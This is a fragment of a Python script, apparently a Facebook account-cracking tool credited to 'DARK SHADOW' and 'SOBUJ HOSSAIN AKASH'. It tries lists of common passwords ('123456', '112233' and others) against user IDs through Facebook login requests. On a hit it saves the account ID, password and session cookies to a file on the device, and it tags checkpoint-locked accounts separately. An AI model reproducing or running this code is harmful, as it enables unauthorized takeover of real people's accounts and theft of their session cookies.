...
logo = f"""{A}
\033[1;91m /$$$$$$$  /$$$$$$$$ /$$    /$$ /$$$$$$ /$$      
\033[1;91m| $$__  $$| $$_____/| $$   | $$|_  $$_/| $$      
\033[1;91m| $$  \ $$| $$      | $$   | $$  | $$  | $$      
\033[1;91m| $$  | $$| $$$$$   |  $$ / $$/  | $$  | $$      
\033[1;91m| $$  | $$| $$__/    \  $$ $$/   | $$  | $$      
\033[1;91m| $$  | $$| $$        \  $$$/    | $$  | $$      
\033[1;91m| $$$$$$$/| $$$$$$$$   \  $/    /$$$$$$| $$$$$$$$
\033[1;91m|_______/ |________/    \_/    |______/|________/{G1}[{A}V{G1}/{A}06.6{G1}]
{A}———————————————————————————————————————————
 {A}({X1}+{A}){G1} OWNER    {A}:{G1} DARK SHADOW 
 {A}({X1}+{A}){G2} FACEBOOK {A}:{G2} SOBUJ HOSSAIN AKASH 
...
class Cyber_Main:
    def __init__(self):
        ...
        self.loop = 0
        clear()
        os.system('xdg-open https://www.facebook.com/YOUR.NEXT.PAPAH.DARK.SHADOW.YOUR.ABBU')
...
def cyber_1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r {bi}~{A}/{bi}~{G5}(%sDARK-SHADOW{G5}){A} >> %s{A} >>{X5} %s{A} >>{G1} %s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
         ...
         'user-agent':pro,} #https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\r{R}[{G1}DEVIL-ok{R}]{G1} ' +cid+ ' | ' +ps+    f'  \n{A}={G5}[{X}<>{G5}]{A}= {G4}'+coki+ ' ''  ')
                linex()
                open('/sdcard/DEVIL-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+' | '+uid+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"{X}[DEVIL-CP] {uid}|{ps}")
...
def main():
    ...
    linex()
    print('\033[1;32mAuther  : SOBUJ  VAU')
    print('\033[1;33mPower by : DARK SHADOW')
    print('\033[1;32mFecbook : SOBUJ HOSSAIN AKASH')
    linex()
    ...
    print(logo)
    linex()
    print(f'{G5}Auther      : SOBUJ HOSSAIN')
    print(f'{G4}Power by    : DARK SHADOW')
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","akashold","112233"]:
            ...
            if "session_key" in rp:
                ...
                print(f"\r\r{R}[{G2}DEVIL-OK🌺{R}]{G1} {uid} • {pw}")
